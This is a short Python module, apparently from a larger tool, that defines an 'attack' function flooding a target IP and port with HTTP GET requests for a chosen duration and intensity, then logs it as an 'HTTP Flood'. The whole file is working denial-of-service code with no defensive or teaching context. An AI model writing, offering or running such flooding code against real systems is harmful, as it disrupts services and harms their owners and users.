import requests
import time
from app.logger import log_attack

def attack(target_ip, target_port, duration, intensity):
    url = f"http://{target_ip}:{target_port}"
    start_time = time.time()
    while time.time() - start_time < duration:
        for _ in range(intensity):
            requests.get(url)

    log_attack("HTTP Flood", target_ip, target_port, duration, intensity)
